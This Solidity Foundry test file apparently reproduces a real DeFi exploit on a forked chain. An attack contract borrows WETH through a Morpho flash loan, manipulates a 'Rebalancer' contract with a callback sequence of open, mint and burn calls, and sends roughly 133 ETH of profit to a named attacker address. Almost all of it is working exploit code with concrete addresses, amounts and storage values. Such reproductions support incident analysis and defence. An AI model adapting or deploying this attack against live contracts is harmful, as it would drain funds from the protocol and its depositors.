
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 23514450;
    uint256 constant TX_TIMESTAMP = 1733818249;
    uint256 constant TX_BLOCK_NUMBER = 23514451;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 133198885880133676669);
    }
}

contract OurAttack {







    function attack() external payable {
        _attack();
    }

    function flashCallback() internal {
        _markCallback(0);
        IRebalancer(Addresses.Rebalancer)
            .open(
                Abi_open_Param0({
                    field0: Addresses.WETH,
                    field1: 1,
                    field2: Addresses.USDC,
                    field3: 8888608,
                    field4: Addresses.ZERO,
                    field5: 8888708
                }),
                Abi_open_Param1({
                    field0: Addresses.USDC,
                    field1: 1,
                    field2: Addresses.WETH,
                    field3: 8888608,
                    field4: Addresses.ZERO,
                    field5: 8888708
                }),
                bytes32(hex"0000000000000000000000000000000000000000000000000000000000000001"),
                address(this)
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(2)),
                bytes32(uint256(66742146805360564659135050018168468442570402045524699117188819470563059378197))
            );
        IERC20Like(Addresses.USDC).approve(Addresses.Rebalancer, type(uint256).max);
        IERC20Like(Addresses.WETH).approve(Addresses.Rebalancer, 267400000000000000000);
        uint256 rebalancerMintReturn = IRebalancer(Addresses.Rebalancer)
            .mint(
                bytes32(hex"938eb76667bf468f80aca3db40520d8f99b6ca93c4c70caa3c3813830e9b2815"),
                267400000000000000000,
                267400000000000000000,
                0
            );
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(3)), bytes32(uint256(133700000000000000000)));
        IRebalancer(Addresses.Rebalancer)
            .burn(
                bytes32(hex"938eb76667bf468f80aca3db40520d8f99b6ca93c4c70caa3c3813830e9b2815"),
                133700000000000000000,
                0,
                0
            );
        IERC20Like(Addresses.WETH).approve(Addresses.Morpho, rebalancerMintReturn);
    }

    function _callback() internal {
        _markCallback(1);
    }

    function _attack() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.Rebalancer);
        {
            bytes memory flashLoanProof = abi.encode(0x00000000000000000000000e7EEBA3410B740000);
            IMorpho(Addresses.Morpho).flashLoan(Addresses.WETH, 267400000000000000000, flashLoanProof);
        }
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackAttackContract);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 133700000000000000000) nativeTransferAmount = 133700000000000000000;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _callback2() internal {
        _markCallback(3);
        uint256 rebalancerBalanceOfAttackAttackContract = IRebalancer(Addresses.Rebalancer)
            .balanceOf(address(this), 0x938eb76667bf468f80aca3db40520d8f99b6ca93c4c70caa3c3813830e9b2815);
        IRebalancer(Addresses.Rebalancer)
            .burn(
                bytes32(hex"938eb76667bf468f80aca3db40520d8f99b6ca93c4c70caa3c3813830e9b2815"),
                rebalancerBalanceOfAttackAttackContract,
                0,
                0
            );
    }

    function _callback3() internal {
        _markCallback(4);
        IRebalancer(Addresses.Rebalancer)
            .balanceOf(address(this), 0x938eb76667bf468f80aca3db40520d8f99b6ca93c4c70caa3c3813830e9b2815);
    }

    function _attack2() internal {
        _markCallback(5);
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        flashCallback();
        return;
    }

    function setup() external payable {
        _attack();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0xa3a36f55) {
            return;
        }
        if (msg.sig == 0xdb7c74b6) {
            uint256 dispatchOrdinal = _nextDispatch(0xdb7c74b6);
            if (dispatchOrdinal == 0) {
                _callback2();
                return;
            }
            if (dispatchOrdinal == 1) {
                _callback3();
                return;
            }
            _callback2();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025;
    address internal constant attack_contract = 0x32Fb1BedD95BF78ca2c6943aE5AEaEAAFc0d97C1;
    address internal constant CLOB_ORDER = 0x382CCccbD3b142D7DA063bF68cd0c89634767F76;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant Rebalancer = 0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant USDC = 0xd3c8d0cd07Ade92df2d88752D36b80498cA12788;
}

struct Abi_open_Param0 {
    address field0;
    uint64 field1;
    address field2;
    uint24 field3;
    address field4;
    uint24 field5;
}

struct Abi_open_Param1 {
    address field0;
    uint64 field1;
    address field2;
    uint24 field3;
    address field4;
    uint24 field5;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IRebalancer {
    function balanceOf(address, uint256) external view returns (uint256);
    function burn(bytes32, uint256, uint256, uint256) external;
    function mint(bytes32, uint256, uint256, uint256) external returns (uint256);
    function open(Abi_open_Param0 calldata, Abi_open_Param1 calldata, bytes32, address) external returns (uint256);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function mint(address to) external returns (uint256 liquidity);
}

interface IWETH {
    function withdraw(uint256) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
